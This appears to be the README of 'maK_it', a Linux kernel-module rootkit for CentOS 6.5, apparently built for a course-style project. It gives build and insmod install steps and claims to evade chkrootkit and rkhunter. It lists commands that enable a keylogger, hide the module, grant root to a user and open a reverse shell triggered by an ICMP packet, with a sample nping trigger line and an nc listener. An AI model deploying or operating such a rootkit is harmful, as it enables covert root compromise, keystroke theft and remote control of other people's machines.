maK_it-Linux-Rootkit

========================

This is a simple rootkit implementation for the project described
at the following location

https://web.archive.org/web/20190119045332/https://r00tkit.me/


This rootkit avoids both the chkrootkit & rkhunter scanners as intended.

It is fully compatible with the latest version of CentOS 6.5


To run simply run "make" in the folder with the Makefile.

install with 
insmod maK_it.ko

Remove with 
rmmod maK_it


===============
Demo Commands
===============
Echo any of the following into /dev/.maK_it


debug - turn /var/log/messages debug messages on or off.

keyLogOn - turn the keylogger on

keyLogOff - turn the keylogger off

modHide - hide the module (hidden by default in insmod)

modReveal - reveal the module (so you can rmmod it)

rootMe - give root privileges to user

shellUp - Turn on a packet sniffer for reverse shell icmp

shellDown - Turn off the packet sniffer daemon

To trigger the reverse shell, listen on a port of your choice
on your own machine. The shell will be returned if you send an 
icmp packet with the right trigger word, your ip/port.

Example: nping --icmp -c 1 -dest-ip 127.0.0.1 --data-string 'maK_it_$H3LL 127.0.0.1 31337'

A port listener can be simply opened on your machine using nc -l 31337
